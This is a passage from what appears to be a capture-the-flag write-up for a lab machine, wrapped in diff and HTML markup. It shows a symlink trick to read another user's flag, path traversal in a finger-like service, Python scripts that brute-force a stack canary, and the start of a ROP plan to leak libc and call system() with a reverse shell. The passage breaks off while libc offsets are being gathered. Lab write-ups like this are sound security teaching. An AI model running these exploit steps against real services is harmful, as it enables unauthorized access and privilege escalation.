+Subject: Flag &lt;span class=&quot;c&quot;&gt;#2&lt;/span&gt;
+Date: Thu,  2 Jan 2014 11:38:22 &lt;span class=&quot;nt&quot;&gt;-0800&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PST&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Alice,
+
+I need you to login to my account. My password is &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /home/bob/flag.txt
+You&lt;span class=&quot;s1&quot;&gt;'ll need to authenticate to Flag Vault in order to get its contents.
+
+--
+Bob
+
+
+&amp;amp;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This one was simple enough to get the flag, a symbolic link to our flag.txt file and our own auth.txt file and we got the password for bob.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alice@baffle:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/alice
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/alice
+alice@baffle:/home/alice&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+total 44
+drwxr-xr-x 3 alice alice 4096 Dec 19 07:49 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 6 root  root  4096 Oct 20 03:38 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 alice alice    0 Oct 25 04:20 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 alice alice  220 Oct 17 15:23 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 alice alice 3515 Oct 17 15:23 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  root    29 Oct 20 03:37 .plan
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 alice alice  675 Oct 17 15:23 .profile
+drwx------ 2 root  root  4096 Oct 25 04:21 .ssh
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 alice alice 8376 Oct 17 15:24 ctftp
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 alice alice  570 Dec 19 07:49 mbox
+alice@baffle:/home/alice&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ../bob/filez/flag.txt flag.txt
+&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ../bob/filez/flag.txt flag.txt
+alice@baffle:/home/alice&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; auth.txt
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; auth.txt
+alice@baffle:/home/alice&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;../bob/filez/flag_vault
+../bob/filez/flag_vault
+______ _                _    _   _             _ _
+|  ___| |            /&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |/&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; | | |           | | |
+| |_  | | __ _  __ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' /| | | | __ _ _   _| | |_
+|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
+| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
+\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
+                __/ |
+               |___/
+
+ENTER YOUR AUTHENTICATION CODE: password
+password
+CHECKING CODE... CODE IS VALID
+DATA: FLAG{tr3each3ry_anD_cUnn1ng}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now comes the part I am dreading to write. Upon examination of /home/bob/binz we find a ctfingerd binary. I copied the file over to my machine for some testing, looks like it takes a user name as input and reads back the contents of the .plan file from their home directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64# ./ctfingerd &amp;amp;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] 28646
+root@kali:/mnt/hgfs/kali64# + &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
++ waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;connections...
+
+root@kali:/mnt/hgfs/kali64# nc 127.0.0.1 7979
++ connection accepted
++ back &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;parent
+Socket fd: 4
+User to query: root
+User to query: plan_loc &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/root/.plan]
+Checking...
+Don&lt;span class=&quot;s1&quot;&gt;'t know anything about this user.
+---
+^C
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Little bit of testing and I find I can read any file on the target system, but that doesn’t help me much other then get me another flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bob@baffle:/home/alice&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 127.0.0.1 7979
+Socket fd: 16
+User to query: /./././charlie/flag.txt
+Checking...
+FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;i_haz_sriracha_ice_cream&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+bob@baffle:/home/alice&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 127.0.0.1 7979
+Socket fd: 17
+User to query: /./././vulnhub/flag.txt
+Checking...
+Sorry Mario. The flag is &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;another castle.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So I need to find a way to escalate privileges with this. Much to my demise, I see this in the disassembled code.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x00400e0c    e82ffbffff     call sym.imp.__stack_chk_fail &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;sym.imp.__stack_chk_fail&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That’s right, there is a canary. I did some research and found that we can brute force the canary as it is a static canary, even though the application forks a new process on each connection it inherits the canary from the parent process. This is good, but now we just need to find a way to determine when we have triggered the check fail. Lucky for us, the application gives us a hint.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64# nc 127.0.0.1 7979
+Socket fd: 8
+User to query: root
+Checking...
+Don&lt;span class=&quot;s1&quot;&gt;'t know anything about this user.
+---
+^C
+root@kali:/mnt/hgfs/kali64# python -c'&lt;/span&gt;print &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 1001&lt;span class=&quot;s1&quot;&gt;' | nc 127.0.0.1 7979
+Socket fd: 9
+User to query: Checking...
+Don'&lt;/span&gt;t know anything about this user.
+
+…SNIP…
+
+|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;|     0x00400f20    e861fcffff     call sym.query_user &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;sym.query_user&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;|     0x00400f25    8b45c4         mov eax, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-local_7_4]
+|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;|     0x00400f28    ba04000000     mov edx, 4
+|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;|     0x00400f2d    be1b114000     mov esi, str.____n            &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;---.&quot;&lt;/span&gt; @ 0x40111b
+|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;|     0x00400f32    89c7           mov edi, eax
+|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;|     0x00400f34    e8e7f9ffff     call sym.imp.write &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;sym.imp.write&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, if query_user returns to main, then ‘—‘ is written to the socket. With this information, we can quickly find out exactly when we start to trigger the stack protection.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;990&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Getting canary offset&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;---&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Server response &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Canary offset: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the above, we are simply increasing our buffer size until we no longer see ’—‘ in the output, subtract one and we have our offset.&lt;/p&gt;
+
+&lt;p&gt;Loaded with this information, we can now brute force the canary. We will overwrite it one byte at a time until we get the full canary.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Bruteforcing Canary&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary_byte&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;hex_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex_byte&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;---&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex_byte&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Found canary byte: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] Canary currently: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Canary found: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now comes the fun part. Because of ASLR we can’t just overwrite the return address and jump right into our shellcode, and unlike before we don’t have a handy variable containing our shellcode. Instead, we’ll need to use ROP chains to accomplish what we need.&lt;/p&gt;
+
+&lt;p&gt;So here is the plan:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Leak address of a library function in the GOT.&lt;/li&gt;
+  &lt;li&gt;Obtain libc’s base address to calculate the address of other library functions. The base address will be the difference between our leaked address and the offset of that address in libc.so.6.&lt;/li&gt;
+  &lt;li&gt;Add offset of system() from libc.so.6 back to the libc base address to get the address of system().&lt;/li&gt;
+  &lt;li&gt;Write our reverse shell to a location in memory that is writable.&lt;/li&gt;
+  &lt;li&gt;Call system() with our reverse shell and reap the rewards.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;For stage one, we’ll leak the address of memset(). Note that I had to pull down libc6.so.6 from the target to get all the offsets needed.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get address of write@plt = 0x400920&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64# objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; ./ctfingerd | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A5&lt;/span&gt; write@
+0000000000400920 &amp;lt;write@plt&amp;gt;:
+  400920:	ff 25 8a 0b 20 00    	jmpq   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x200b8a&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# 6014b0 &amp;lt;_GLOBAL_OFFSET_TABLE_+0x30&amp;gt;&lt;/span&gt;
+  400926:	68 03 00 00 00       	pushq  &lt;span class=&quot;nv&quot;&gt;$0x3&lt;/span&gt;
+  40092b:	e9 b0 ff ff ff       	jmpq   4008e0 &amp;lt;_init+0x20&amp;gt;
+
+… SNIP …
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get offset of memset() from libc.so.6 = 0x85620&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64# readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;memset
+    66: 000000000009d850    90 FUNC    GLOBAL DEFAULT   12 wmemset@@GLIBC_2.2.5
+   771: 00000000000f7780    16 FUNC    GLOBAL DEFAULT   12 __wmemset_chk@@GLIBC_2.4
+   838: 0000000000085620   247 FUNC    GLOBAL DEFAULT   12 memset@@GLIBC_2.2.5
+  1383: 0000000000085610     9 FUNC    GLOBAL DEFAULT   12 __memset_chk@@GLIBC_2.3.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get offset of system() from libc.so.6 = 0x41490&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64# readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;system
+   223: 0000000000113ec0    70 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.2.5
+   577: 0000000000041490    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
